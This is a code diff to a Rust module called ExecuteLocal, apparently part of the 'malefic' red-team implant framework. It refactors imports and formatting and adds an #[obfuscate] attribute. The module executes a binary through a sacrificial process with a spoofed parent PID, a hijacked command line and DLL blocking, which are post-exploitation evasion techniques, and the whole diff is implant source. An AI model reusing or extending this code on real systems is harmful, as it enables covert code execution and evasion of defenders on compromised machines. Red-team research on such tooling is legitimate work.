@@ -1,10 +1,10 @@
 use std::ptr::null_mut;
 
-use malefic_helper::common::utils::format_cmdline;
-use malefic_proto::proto::modulepb::BinaryResponse;
-use malefic_helper::win::kit::pe::run_sacrifice;
-use malefic_helper::common::filesys::get_binary;
 use crate::prelude::*;
+use malefic_common::utils::format_cmdline;
+use malefic_os_win::kit::pe::run_sacrifice;
+use malefic_proto::proto::modulepb::BinaryResponse;
+use malefic_sysinfo::filesys::get_binary;
 
 pub struct ExecuteLocal {}
 
@@ -13,9 +13,15 @@ pub struct ExecuteLocal {}
 impl Module for ExecuteLocal {}
 
 #[async_trait]
-impl malefic_proto::module::ModuleImpl for ExecuteLocal {
+#[obfuscate]
+impl malefic_module::ModuleImpl for ExecuteLocal {
     #[allow(unused_variables)]
-    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, sender: &mut malefic_proto::module::Output) -> malefic_proto::module::ModuleResult {
+    async fn run(
+        &mut self,
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+    ) -> malefic_module::ModuleResult {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
 
         let mut exec_response = BinaryResponse::default();
@@ -36,10 +42,14 @@ impl malefic_proto::module::ModuleImpl for ExecuteLocal {
                     hijack_commandline.as_bytes(),
                     sacrifice.ppid,
                     request.output,
-                    sacrifice.block_dll);
+                    sacrifice.block_dll,
+                );
             }
         }
         exec_response.data = result;
-        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(exec_response)))
+        Ok(TaskResult::new_with_body(
+            id,
+            Body::BinaryResponse(exec_response),
+        ))
     }
 }
